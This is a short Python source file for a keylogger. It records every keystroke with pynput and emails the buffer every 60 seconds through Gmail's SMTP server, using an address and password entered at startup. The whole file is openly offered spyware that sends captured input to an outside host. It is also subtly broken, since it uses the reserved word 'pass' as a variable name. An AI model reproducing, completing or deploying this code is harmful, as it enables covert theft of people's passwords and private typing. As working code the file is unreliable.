import threading
import pynput.keyboard as keyboard
import smtplib


class Keylogger:
    def __init__(self, time, email, password):
        self.keys = ""
        self.time=time
        self.email=email
        self.password=password
        self.start()

    def log(self, string):
        self.keys+=string
    
    def key_press(self, key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key= " "+str(key)+" "
        self.log(current_key)

    def send_mail(self, email, password, message):
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def sendReport(self):
        self.send_mail(self.email, self.password, self.keys)
        self.keys=' '
        timer=threading.Timer(self.time, self.sendReport)
        timer.start()

    def start(self):
        listen = keyboard.Listener(on_press=self.key_press)
        with listen as listener:
            self.sendReport()
            listener.join()
mail=input("enter mail id ")
pass=input("enter password")
my_keylogger=Keylogger(60, mail, pass )
